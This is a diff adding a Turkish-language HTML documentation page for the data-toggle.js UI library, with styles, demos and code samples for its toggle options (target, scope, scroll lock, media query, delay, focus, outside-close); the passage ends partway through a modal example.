@@ -1,0 +1,1302 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link rel="shortcut icon" href="favicon.png" type="image/x-icon" />
+   <title>Data Toggle — Dokümantasyon</title>
+   <style>
+      :root {
+         --bg: #0f1117;
+         --surface: #1a1d27;
+         --surface-2: #232734;
+         --border: #2e3348;
+         --text: #e2e4ed;
+         --text-muted: #8b8fa7;
+         --accent: #6c8aff;
+         --accent-hover: #8da5ff;
+         --green: #4ade80;
+         --orange: #fb923c;
+         --red: #f87171;
+         --code-bg: #141620;
+         --radius: 10px;
+         --toggle-class: toggle;
+      }
+
+      * {
+         box-sizing: border-box;
+         margin: 0;
+         padding: 0;
+      }
+
+      body {
+         font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+         background: var(--bg);
+         color: var(--text);
+         line-height: 1.65;
+         padding: 0;
+      }
+
+      /* Scroll Lock Demo */
+      .overflow-hidden {
+         overflow: hidden !important;
+      }
+
+      /* Toggle class */
+      .toggle {
+         /* Generic active state — used by demos */
+      }
+
+      /* ── Layout ── */
+      .wrapper {
+         max-width: 960px;
+         margin: 0 auto;
+         padding: 3rem 1.5rem 6rem;
+      }
+
+      /* ── Hero ── */
+      .hero {
+         text-align: center;
+         margin-bottom: 4rem;
+         padding: 3rem 1rem;
+         border-bottom: 1px solid var(--border);
+      }
+
+      .hero h1 {
+         font-size: 2.6rem;
+         font-weight: 700;
+         letter-spacing: -0.03em;
+         margin-bottom: 0.5rem;
+      }
+
+      .hero h1 span {
+         color: var(--accent);
+      }
+
+      .hero p {
+         color: var(--text-muted);
+         font-size: 1.15rem;
+         max-width: 600px;
+         margin: 0 auto;
+      }
+
+      /* ── TOC ── */
+      .toc {
+         background: var(--surface);
+         border: 1px solid var(--border);
+         border-radius: var(--radius);
+         padding: 1.5rem 2rem;
+         margin-bottom: 3rem;
+      }
+
+      .toc h2 {
+         font-size: 1rem;
+         text-transform: uppercase;
+         letter-spacing: 0.08em;
+         color: var(--text-muted);
+         margin-bottom: 1rem;
+      }
+
+      .toc ul {
+         list-style: none;
+         display: grid;
+         grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+         gap: 0.4rem 2rem;
+      }
+
+      .toc a {
+         color: var(--accent);
+         text-decoration: none;
+         font-size: 0.95rem;
+         transition: color 0.2s;
+      }
+
+      .toc a:hover {
+         color: var(--accent-hover);
+         text-decoration: underline;
+      }
+
+      /* ── Section ── */
+      .section {
+         margin-bottom: 3.5rem;
+      }
+
+      .section-header {
+         display: flex;
+         align-items: center;
+         gap: 0.75rem;
+         margin-bottom: 0.5rem;
+      }
+
+      .section-header h2 {
+         font-size: 1.5rem;
+         font-weight: 600;
+      }
+
+      .badge {
+         display: inline-block;
+         font-size: 0.7rem;
+         font-weight: 600;
+         text-transform: uppercase;
+         letter-spacing: 0.06em;
+         padding: 0.2rem 0.6rem;
+         border-radius: 999px;
+         background: var(--accent);
+         color: var(--bg);
+      }
+
+      .section>p {
+         color: var(--text-muted);
+         margin-bottom: 1.25rem;
+         max-width: 700px;
+      }
+
+      /* ── Syntax ── */
+      .syntax {
+         background: var(--code-bg);
+         border: 1px solid var(--border);
+         border-radius: var(--radius);
+         padding: 0.5rem 1rem;
+         margin-bottom: 1.25rem;
+         font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+         font-size: 0.88rem;
+         color: var(--orange);
+         overflow-x: auto;
+      }
+
+      /* ── Demo Card ── */
+      .demo-card {
+         background: var(--surface);
+         border: 1px solid var(--border);
+         border-radius: var(--radius);
+         overflow: hidden;
+         margin-bottom: 1rem;
+      }
+
+      .demo-area {
+         padding: 2rem;
+         display: flex;
+         flex-wrap: wrap;
+         align-items: center;
+         gap: 1rem;
+         min-height: 80px;
+         position: relative;
+      }
+
+      .demo-area.column {
+         flex-direction: column;
+         align-items: flex-start;
+      }
+
+      .code-block {
+         background: var(--code-bg);
+         border-top: 1px solid var(--border);
+         padding: 1rem 1.25rem;
+         overflow-x: auto;
+         position: relative;
+      }
+
+      .code-block pre {
+         font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+         font-size: 0.82rem;
+         line-height: 1.7;
+         color: var(--text-muted);
+         white-space: pre;
+         margin: 0;
+      }
+
+      .code-block .tag {
+         color: var(--red);
+      }
+
+      .code-block .attr {
+         color: var(--orange);
+      }
+
+      .code-block .str {
+         color: var(--green);
+      }
+
+      .code-block .cmt {
+         color: #555b78;
+         font-style: italic;
+      }
+
+      .code-label {
+         display: inline-block;
+         font-size: 0.7rem;
+         font-weight: 600;
+         text-transform: uppercase;
+         letter-spacing: 0.06em;
+         color: var(--text-muted);
+         margin-bottom: 0.5rem;
+      }
+
+      /* ── Demo Buttons & Elements ── */
+      .btn {
+         display: inline-flex;
+         align-items: center;
+         gap: 0.4rem;
+         padding: 0.55rem 1.2rem;
+         border-radius: 8px;
+         border: 1px solid var(--border);
+         background: var(--surface-2);
+         color: var(--text);
+         font-size: 0.9rem;
+         font-weight: 500;
+         cursor: pointer;
+         transition: all 0.2s;
+         user-select: none;
+      }
+
+      .btn:hover {
+         border-color: var(--accent);
+         background: #2a2e42;
+      }
+
+      .btn.toggle {
+         background: var(--accent);
+         color: var(--bg);
+         border-color: var(--accent);
+      }
+
+      .target-box {
+         padding: 1rem 1.5rem;
+         border-radius: 8px;
+         background: var(--surface-2);
+         border: 1px dashed var(--border);
+         color: var(--text-muted);
+         font-size: 0.9rem;
+         transition: all 0.3s ease;
+         min-width: 200px;
+      }
+
+      .target-box.toggle {
+         background: #1a2e1a;
+         border-color: var(--green);
+         color: var(--green);
+         border-style: solid;
+      }
+
+      /* Dropdown Demo */
+      .dropdown-wrapper {
+         position: relative;
+      }
+
+      .dropdown-menu {
+         position: absolute;
+         top: calc(100% + 6px);
+         left: 0;
+         min-width: 180px;
+         background: var(--surface-2);
+         border: 1px solid var(--border);
+         border-radius: 8px;
+         padding: 0.4rem;
+         display: none;
+         z-index: 10;
+         box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
+      }
+
+      .dropdown-menu.toggle {
+         display: block;
+      }
+
+      .dropdown-menu a {
+         display: block;
+         padding: 0.5rem 0.75rem;
+         color: var(--text);
+         text-decoration: none;
+         border-radius: 6px;
+         font-size: 0.88rem;
+         transition: background 0.15s;
+      }
+
+      .dropdown-menu a:hover {
+         background: var(--border);
+      }
+
+      /* Tab Demo */
+      .tabs-bar {
+         display: flex;
+         gap: 0.25rem;
+         border-bottom: 1px solid var(--border);
+         padding-bottom: 0;
+         margin-bottom: 1rem;
+      }
+
+      .tab-btn {
+         padding: 0.5rem 1.2rem;
+         border: none;
+         background: none;
+         color: var(--text-muted);
+         font-size: 0.9rem;
+         cursor: pointer;
+         border-bottom: 2px solid transparent;
+         transition: all 0.2s;
+         margin-bottom: -1px;
+      }
+
+      .tab-btn:hover {
+         color: var(--text);
+      }
+
+      .tab-btn.toggle {
+         color: var(--accent);
+         border-bottom-color: var(--accent);
+      }
+
+      .tab-panel {
+         padding: 1rem 0;
+         color: var(--text-muted);
+         font-size: 0.9rem;
+      }
+
+      div.tab-panel {
+         display: none;
+      }
+
+      div.tab-panel.toggle {
+         display: block;
+      }
+
+      /* Sidebar Demo */
+      .sidebar-demo {
+         width: 100%;
+         min-height: 180px;
+         border: 1px solid var(--border);
+         border-radius: 8px;
+         overflow: hidden;
+         position: relative;
+         background: var(--code-bg);
+      }
+
+      .sidebar-panel {
+         position: absolute;
+         left: 0;
+         top: 0;
+         bottom: 0;
+         width: 200px;
+         background: var(--surface-2);
+         border-right: 1px solid var(--border);
+         transform: translateX(-100%);
+         transition: transform 0.3s ease;
+         padding: 1rem;
+         z-index: 5;
+      }
+
+      .sidebar-panel.toggle {
+         transform: translateX(0);
+      }
+
+      .sidebar-panel p {
+         color: var(--text-muted);
+         font-size: 0.85rem;
+      }
+
+      .sidebar-demo .content-area {
+         padding: 1rem;
+         text-align: center;
+         color: var(--text-muted);
+         font-size: 0.85rem;
+      }
+
+      /* Accordion Demo */
+      .accordion-item {
+         border: 1px solid var(--border);
+         border-radius: 8px;
+         margin-bottom: 0.5rem;
+         overflow: hidden;
+         width: 100%;
+      }
+
+      .accordion-header {
+         display: flex;
+         justify-content: space-between;
+         align-items: center;
+         padding: 0.75rem 1rem;
+         background: var(--surface-2);
+         border: none;
+         color: var(--text);
+         width: 100%;
+         cursor: pointer;
+         font-size: 0.9rem;
+         text-align: left;
+         transition: background 0.2s;
+      }
+
+      .accordion-header:hover {
+         background: var(--border);
+      }
+
+      .accordion-header .arrow {
+         transition: transform 0.3s;
+         font-size: 0.7rem;
+         color: var(--text-muted);
+      }
+
+      .accordion-body {
+         max-height: 0;
+         overflow: hidden;
+         transition: max-height 0.3s ease;
+         background: var(--surface);
+      }
+
+      .accordion-body.toggle {
+         max-height: 200px;
+      }
+
+      .accordion-body-inner {
+         padding: 1rem;
+         font-size: 0.88rem;
+         color: var(--text-muted);
+      }
+
+      /* Modal Demo */
+      .modal-overlay {
+         display: none;
+         position: fixed;
+         inset: 0;
+         background: rgba(0, 0, 0, 0.6);
+         z-index: 100;
+         justify-content: center;
+         align-items: center;
+         backdrop-filter: blur(4px);
+      }
+
+      .modal-overlay.toggle {
+         display: flex;
+      }
+
+      .modal-box {
+         background: var(--surface);
+         border: 1px solid var(--border);
+         border-radius: 12px;
+         padding: 2rem;
+         max-width: 420px;
+         width: 90%;
+         text-align: center;
+      }
+
+      .modal-box h3 {
+         margin-bottom: 0.5rem;
+         font-size: 1.2rem;
+      }
+
+      .modal-box p {
+         color: var(--text-muted);
+         font-size: 0.9rem;
+         margin-bottom: 1.5rem;
+      }
+
+      /* Search Demo */
+      .search-wrapper {
+         width: 100%;
+         max-width: 400px;
+      }
+
+      .search-box {
+         display: none;
+         margin-top: 0.75rem;
+      }
+
+      .search-box.toggle {
+         display: block;
+      }
+
+      .search-box input {
+         width: 100%;
+         padding: 0.65rem 1rem;
+         border-radius: 8px;
+         border: 1px solid var(--border);
+         background: var(--code-bg);
+         color: var(--text);
+         font-size: 0.9rem;
+         outline: none;
+         transition: border-color 0.2s;
+      }
+
+      .search-box input:focus {
+         border-color: var(--accent);
+      }
+
+      /* Media Badge */
+      .media-indicator {
+         display: inline-block;
+         padding: 0.3rem 0.8rem;
+         border-radius: 6px;
+         font-size: 0.8rem;
+         background: var(--surface-2);
+         border: 1px solid var(--border);
+         color: var(--text-muted);
+      }
+
+      /* ── Notes ── */
+      .note {
+         background: #1a1d27;
+         border-left: 3px solid var(--accent);
+         padding: 0.8rem 1rem;
+         border-radius: 0 var(--radius) var(--radius) 0;
+         margin-top: 1rem;
+         font-size: 0.85rem;
+         color: var(--text-muted);
+      }
+
+      .note strong {
+         color: var(--text);
+      }
+
+      /* ── Status Indicator ── */
+      .status-dot {
+         width: 8px;
+         height: 8px;
+         border-radius: 50%;
+         background: var(--red);
+         display: inline-block;
+         transition: background 0.3s;
+      }
+
+      .status-dot.toggle {
+         background: var(--green);
+      }
+
+      /* ── Responsive ── */
+      @media (max-width: 640px) {
+         .hero h1 {
+            font-size: 1.8rem;
+         }
+
+         .wrapper {
+            padding: 2rem 1rem 4rem;
+         }
+
+         .toc ul {
+            grid-template-columns: 1fr;
+         }
+      }
+
+      /* ── Footer ── */
+      .footer {
+         text-align: center;
+         padding: 2rem 0;
+         border-top: 1px solid var(--border);
+         margin-top: 2rem;
+         color: var(--text-muted);
+         font-size: 0.82rem;
+      }
+   </style>
+</head>
+
+<body>
+   <div class="wrapper">
+
+      <!-- ════════════ HERO ════════════ -->
+      <header class="hero">
+         <h1><span>data-toggle</span>.js</h1>
+         <p>SSR-uyumlu, hafif ve esnek bir toggle yöneticisi. Tek bir <code>data-toggle</code> attribute ile class toggle, scope, scroll lock, media query, focus ve daha fazlası.</p>
+      </header>
+
+      <!-- ════════════ TOC ════════════ -->
+      <nav class="toc">
+         <h2>İçindekiler</h2>
+         <ul>
+            <li><a href="#self">self — Kendine Toggle</a></li>
+            <li><a href="#target">target — Hedef Eleman</a></li>
+            <li><a href="#scope">scope — Grup İçinde Tekil</a></li>
+            <li><a href="#lock-scroll">lock-scroll — Kaydırma Kilidi</a></li>
+            <li><a href="#media">media — Media Query</a></li>
+            <li><a href="#delay">delay — Gecikme</a></li>
+            <li><a href="#focus">focus — Otomatik Odaklanma</a></li>
+            <li><a href="#outside-close">outside-close — Dışarı Tıklama</a></li>
+            <li><a href="#combined">Birleşik Örnekler</a></li>
+         </ul>
+      </nav>
+
+      <!-- ═══════════════════════════════════════════════
+           1. SELF
+      ═══════════════════════════════════════════════ -->
+      <section id="self" class="section">
+         <div class="section-header">
+            <h2>self</h2>
+            <span class="badge">Temel</span>
+         </div>
+         <p>Tıklanan elemana toggle class'ı ekler/kaldırır. En basit kullanım şeklidir — buton kendi üzerinde class değiştirir.</p>
+
+         <div class="syntax"><code>data-toggle="self"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area">
+               <button class="btn" data-toggle="self">Tıkla — Toggle Et</button>
+               <span style="font-size:0.82rem;color:var(--text-muted)">← Butona tıkla, <code>.toggle</code> class'ı eklenip kalkacak</span>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="tag">&lt;button</span> <span class="attr">class</span>=<span class="str">"btn"</span> <span class="attr">data-toggle</span>=<span class="str">"self"</span><span class="tag">&gt;</span>
+   Tıkla — Toggle Et
+<span class="tag">&lt;/button&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>Nasıl çalışır?</strong> <code>self</code> parametresi, tıklanan elemanın kendisine <code>.toggle</code> class'ı ekler. Tekrar tıklanırsa class kaldırılır.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           2. TARGET
+      ═══════════════════════════════════════════════ -->
+      <section id="target" class="section">
+         <div class="section-header">
+            <h2>target:&lt;selector&gt;</h2>
+            <span class="badge">Temel</span>
+         </div>
+         <p>Belirtilen CSS seçiciye sahip elemanlara toggle class'ı ekler/kaldırır. Buton başka bir öğeyi kontrol eder.</p>
+
+         <div class="syntax"><code>data-toggle="target:#my-panel"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <button class="btn" data-toggle="target:#target-demo-box">Paneli Aç/Kapa</button>
+               <div id="target-demo-box" class="target-box">
+                  📦 Hedef Panel — <code>.toggle</code> class'ı bu elemana eklenir
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:#my-panel"</span><span class="tag">&gt;</span>Paneli Aç/Kapa<span class="tag">&lt;/button&gt;</span>
+
+<span class="tag">&lt;div</span> <span class="attr">id</span>=<span class="str">"my-panel"</span> <span class="attr">class</span>=<span class="str">"target-box"</span><span class="tag">&gt;</span>
+   Hedef Panel
+<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>Çoklu hedef:</strong> Seçici birden fazla elemanla eşleşirse hepsine toggle uygulanır. Örneğin <code>target:.card</code> tüm <code>.card</code> elemanlarını etkiler.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           3. SCOPE
+      ═══════════════════════════════════════════════ -->
+      <section id="scope" class="section">
+         <div class="section-header">
+            <h2>scope:&lt;selector&gt;</h2>
+            <span class="badge">Gelişmiş</span>
+         </div>
+         <p>Bir grup içinden sadece birinin aktif olmasını sağlar. Önce scope'taki tüm elemanlardan class kaldırılır, sonra seçilen elemana eklenir. Tab, akordeon gibi yapılar için idealdir.</p>
+
+         <div class="syntax"><code>data-toggle="target:#panel-1, scope:.tab-panel"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="tabs-bar">
+                  <button class="tab-btn tab-panel toggle" data-toggle="self, target:#tab-1, scope:.tab-panel">Genel</button>
+                  <button class="tab-btn tab-panel" data-toggle="self, target:#tab-2, scope:.tab-panel">Ayarlar</button>
+                  <button class="tab-btn tab-panel" data-toggle="self, target:#tab-3, scope:.tab-panel">Profil</button>
+               </div>
+               <div id="tab-1" class="tab-panel toggle">
+                  📄 <strong>Genel</strong> — Bu sekme varsayılan olarak aktif. Scope sayesinde diğer sekmeler kapanır.
+               </div>
+               <div id="tab-2" class="tab-panel">
+                  ⚙️ <strong>Ayarlar</strong> — Uygulama yapılandırma seçenekleri burada yer alır.
+               </div>
+               <div id="tab-3" class="tab-panel">
+                  👤 <strong>Profil</strong> — Kullanıcı bilgileri ve tercihler bu sekmede.
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- Butonlara tab-panel eklenir, scope hepsini temizler --&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">class</span>=<span class="str">"tab-btn tab-panel toggle"</span>
+   <span class="attr">data-toggle</span>=<span class="str">"self, target:#tab-1, scope:.tab-panel"</span><span class="tag">&gt;</span>
+   Genel
+<span class="tag">&lt;/button&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">class</span>=<span class="str">"tab-btn tab-panel"</span>
+   <span class="attr">data-toggle</span>=<span class="str">"self, target:#tab-2, scope:.tab-panel"</span><span class="tag">&gt;</span>
+   Ayarlar
+<span class="tag">&lt;/button&gt;</span>
+
+<span class="cmt">&lt;!-- Paneller --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">id</span>=<span class="str">"tab-1"</span> <span class="attr">class</span>=<span class="str">"tab-panel toggle"</span><span class="tag">&gt;</span>Genel içerik<span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">id</span>=<span class="str">"tab-2"</span> <span class="attr">class</span>=<span class="str">"tab-panel"</span><span class="tag">&gt;</span>Ayarlar içerik<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>Davranış farkı:</strong> Scope kullanıldığında toggle yerine "birini aç, geri kalanını kapat" mantığı çalışır. Zaten aktif olan elemana tıklanırsa class kaldırılır (hiçbiri aktif olmaz).
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>Önemli:</strong> Butonlara da <code>tab-panel</code> class'ı eklenir. Böylece <code>scope:.tab-panel</code> hem butonlardan hem panellerden <code>.toggle</code> class'ını kaldırır, ardından sadece tıklananla ilişkili elemanlara ekler.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           4. LOCK-SCROLL
+      ═══════════════════════════════════════════════ -->
+      <section id="lock-scroll" class="section">
+         <div class="section-header">
+            <h2>lock-scroll</h2>
+            <span class="badge">Yardımcı</span>
+         </div>
+         <p>Toggle aktif olduğunda belirtilen elemana (varsayılan: <code>body</code>) <code>overflow-hidden</code> class'ı ekleyerek sayfa kaydırmasını engeller. Modal ve sidebar gibi overlay bileşenler için kullanılır.</p>
+
+         <div class="syntax"><code>data-toggle="target:#modal, lock-scroll"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area">
+               <button class="btn" data-toggle="target:#lock-demo-box, lock-scroll:#lock-scroll-area">
+                  Scroll Kilitle/Aç
+               </button>
+               <div id="lock-scroll-area"
+                  style="width:300px;height:120px;overflow:auto;border:1px solid var(--border);border-radius:8px;padding:1rem;background:var(--code-bg);font-size:0.85rem;color:var(--text-muted);">
+                  <div id="lock-demo-box">
+                     Bu alan kaydırılabilir bir kutudur. Butona tıklayarak kaydırmayı kilitleyin.<br><br>
+                     Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore
+                     et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris.<br><br>
+                     Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla
+                     pariatur. Excepteur sint occaecat cupidatat non proident.<br><br>
+                     Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium.
+                  </div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- body'ye overflow-hidden ekler (varsayılan) --&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:#modal, lock-scroll"</span><span class="tag">&gt;</span>
+   Modal Aç
+<span class="tag">&lt;/button&gt;</span>
+
+<span class="cmt">&lt;!-- Belirli bir elemana overflow-hidden ekler --&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:#panel, lock-scroll:#scroll-area"</span><span class="tag">&gt;</span>
+   Scroll Kilitle
+<span class="tag">&lt;/button&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>Varsayılan:</strong> Seçici belirtilmezse (<code>lock-scroll</code>) body elemanına uygulanır. Özel bir hedef için <code>lock-scroll:#my-container</code> kullanın.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           5. MEDIA
+      ═══════════════════════════════════════════════ -->
+      <section id="media" class="section">
+         <div class="section-header">
+            <h2>media:(&lt;query&gt;)</h2>
+            <span class="badge">Koşullu</span>
+         </div>
+         <p>Toggle işlemi yalnızca belirtilen media query eşleştiğinde çalışır. Responsive davranışlar için kullanılır — örneğin sadece mobilde açılan menüler.</p>
+
+         <div class="syntax"><code>data-toggle="target:#mobile-menu, media:(max-width: 768px)"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div style="display:flex;gap:0.75rem;flex-wrap:wrap;align-items:center;">
+                  <button class="btn" data-toggle="self, media:(max-width: 768px)">
+                     Sadece Mobil (≤768px)
+                  </button>
+                  <button class="btn" data-toggle="self, media:(min-width: 769px)">
+                     Sadece Desktop (≥769px)
+                  </button>
+               </div>
+               <span class="media-indicator" id="media-indicator">
+                  Pencere genişliği: <span id="window-width"></span>px
+               </span>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- Sadece 768px ve altında çalışır --&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:#mobile-menu, media:(max-width: 768px)"</span><span class="tag">&gt;</span>
+   Menü
+<span class="tag">&lt;/button&gt;</span>
+
+<span class="cmt">&lt;!-- Sadece 769px ve üstünde çalışır --&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:#sidebar, media:(min-width: 769px)"</span><span class="tag">&gt;</span>
+   Sidebar
+<span class="tag">&lt;/button&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>window.matchMedia:</strong> Standart CSS media query sözdizimi kullanılır. Pencere boyutunu değiştirerek yukarıdaki butonların hangisinin çalıştığını test edebilirsiniz.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           6. DELAY
+      ═══════════════════════════════════════════════ -->
+      <section id="delay" class="section">
+         <div class="section-header">
+            <h2>delay:&lt;ms&gt;</h2>
+            <span class="badge">Zamanlama</span>
+         </div>
+         <p>Toggle işlemini belirtilen süre (milisaniye) kadar geciktirir. CSS animasyonları veya geçiş efektleri için kullanışlıdır. Varsayılan gecikme 16ms'dir.</p>
+
+         <div class="syntax"><code>data-toggle="target:#panel, delay:500"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div style="display:flex;gap:0.75rem;flex-wrap:wrap">
+                  <button class="btn" data-toggle="target:#delay-box-1">Anında (16ms)</button>
+                  <button class="btn" data-toggle="target:#delay-box-2, delay:300">300ms Gecikme</button>
+                  <button class="btn" data-toggle="target:#delay-box-3, delay:1000">1000ms Gecikme</button>
+               </div>
+               <div style="display:flex;gap:0.75rem;flex-wrap:wrap">
+                  <div id="delay-box-1" class="target-box" style="min-width:140px;text-align:center">16ms</div>
+                  <div id="delay-box-2" class="target-box" style="min-width:140px;text-align:center">300ms</div>
+                  <div id="delay-box-3" class="target-box" style="min-width:140px;text-align:center">1000ms</div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- Varsayılan 16ms gecikme --&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:#panel"</span><span class="tag">&gt;</span>Anında<span class="tag">&lt;/button&gt;</span>
+
+<span class="cmt">&lt;!-- 300ms sonra toggle --&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:#panel, delay:300"</span><span class="tag">&gt;</span>Gecikmeli<span class="tag">&lt;/button&gt;</span>
+
+<span class="cmt">&lt;!-- 1 saniye sonra toggle --&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:#panel, delay:1000"</span><span class="tag">&gt;</span>Çok Gecikmeli<span class="tag">&lt;/button&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>Timeout temizleme:</strong> Aynı butona gecikme tamamlanmadan tekrar tıklanırsa eski timeout iptal edilir ve yeni bir zamanlayıcı başlar (debounce benzeri davranış).
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           7. FOCUS
+      ═══════════════════════════════════════════════ -->
+      <section id="focus" class="section">
+         <div class="section-header">
+            <h2>focus</h2>
+            <span class="badge">Erişilebilirlik</span>
+         </div>
+         <p>Toggle çalıştıktan sonra hedef eleman içindeki ilk odaklanabilir öğeye (input, textarea, select vb.) otomatik olarak focus verir. Arama kutuları ve formlar için idealdir.</p>
+
+         <div class="syntax"><code>data-toggle="target:#search-box, focus"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="search-wrapper">
+                  <button class="btn" data-toggle="target:#search-demo, focus">
+                     🔍 Aramayı Aç
+                  </button>
+                  <div id="search-demo" class="search-box">
+                     <input type="text" placeholder="Arama yapın...">
+                  </div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:#search-box, focus"</span><span class="tag">&gt;</span>
+   🔍 Aramayı Aç
+<span class="tag">&lt;/button&gt;</span>
+
+<span class="tag">&lt;div</span> <span class="attr">id</span>=<span class="str">"search-box"</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;input</span> <span class="attr">type</span>=<span class="str">"text"</span> <span class="attr">placeholder</span>=<span class="str">"Arama yapın..."</span><span class="tag"> /&gt;</span>
+<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>Odaklanabilir elemanlar:</strong> <code>input</code>, <code>textarea</code>, <code>select</code> ve <code>[tabindex]</code> attribute'una sahip elemanlar hedef alınır. Yalnızca tek hedef varsa çalışır.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           8. OUTSIDE-CLOSE
+      ═══════════════════════════════════════════════ -->
+      <section id="outside-close" class="section">
+         <div class="section-header">
+            <h2>outside-close</h2>
+            <span class="badge">Etkileşim</span>
+         </div>
+         <p>Hedef eleman açıkken dışına tıklanırsa otomatik olarak kapatılır. Dropdown menüler, popup'lar ve tooltip'ler için idealdir.</p>
+
+         <div class="syntax"><code>data-toggle="target:#dropdown, outside-close"</code></div>
+
+         <div class="demo-card">
+            <div class="demo-area">
+               <div class="dropdown-wrapper">
+                  <button class="btn" data-toggle="target:#dropdown-demo, outside-close">
+                     Menüyü Aç ▾
+                  </button>
+                  <div id="dropdown-demo" class="dropdown-menu">
+                     <a href="#">📁 Dosyalar</a>
+                     <a href="#">⚙️ Ayarlar</a>
+                     <a href="#">👤 Profil</a>
+                     <a href="#">🚪 Çıkış</a>
+                  </div>
+               </div>
+               <span style="font-size:0.82rem;color:var(--text-muted)">← Menüyü aç, sonra dışına tıkla</span>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"dropdown-wrapper"</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:#dropdown, outside-close"</span><span class="tag">&gt;</span>
+      Menüyü Aç ▾
+   <span class="tag">&lt;/button&gt;</span>
+
+   <span class="tag">&lt;div</span> <span class="attr">id</span>=<span class="str">"dropdown"</span> <span class="attr">class</span>=<span class="str">"dropdown-menu"</span><span class="tag">&gt;</span>
+      <span class="tag">&lt;a</span> <span class="attr">href</span>=<span class="str">"#"</span><span class="tag">&gt;</span>Dosyalar<span class="tag">&lt;/a&gt;</span>
+      <span class="tag">&lt;a</span> <span class="attr">href</span>=<span class="str">"#"</span><span class="tag">&gt;</span>Ayarlar<span class="tag">&lt;/a&gt;</span>
+   <span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>Dinleyici temizliği:</strong> Hedef kapandıktan sonra <code>document</code> üzerindeki click listener otomatik olarak kaldırılır, gereksiz dinleyici birikmesi olmaz.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           9. COMBINED EXAMPLES
+      ═══════════════════════════════════════════════ -->
+      <section id="combined" class="section">
+         <div class="section-header">
+            <h2>Birleşik Örnekler</h2>
+            <span class="badge">Pratik</span>
+         </div>
+         <p>Parametreler virgülle birleştirilerek güçlü bileşenler oluşturulabilir. İşte gerçek dünyadan örnekler:</p>
+
+         <!-- Example A: Modal -->
+         <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem;">🔲 Modal Dialog</h3>
+         <div class="demo-card">
+            <div class="demo-area">
+               <button class="btn" data-toggle="target:#modal-demo, lock-scroll">
+                  Modal Aç
+               </button>
+            </div>
+            <div class="code-block">
